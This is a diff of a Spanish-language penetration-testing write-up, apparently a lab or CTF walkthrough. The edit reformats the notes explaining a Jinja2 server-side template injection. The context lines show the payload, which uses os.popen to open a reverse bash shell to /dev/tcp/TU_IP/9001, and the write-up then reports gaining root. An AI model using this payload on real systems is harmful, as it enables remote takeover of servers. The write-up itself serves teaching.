@@ -412,9 +412,9 @@ curl "http://127.0.0.1:7080/?ip=%7B%7Bself._TemplateReference__context.cycler.__
 
 >[!NOTE]
 > **Payload** sin el URL encoding: `{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/TU_IP/9001 0>&1"').read()}}`
-> `{{}}` es una expresión Jinja2 (SSTI)
-> `self._TemplateReference__context.cycler.__init__.__globals__.os.popen('comando')` nos permite acceder a `os.popen()`, el cual ejecuta comando en el sistema
-> y el resto es la shell que redirigimos a nuestra máquina.
+> - `{{}}` es una expresión Jinja2 (SSTI).
+> - `self._TemplateReference__context.cycler.__init__.__globals__.os.popen('comando')` nos permite acceder a `os.popen()`, el cual ejecuta comando en el sistema.
+> - El resto es la shell que redirigimos a nuestra máquina.
 
 
 y ahora somos root
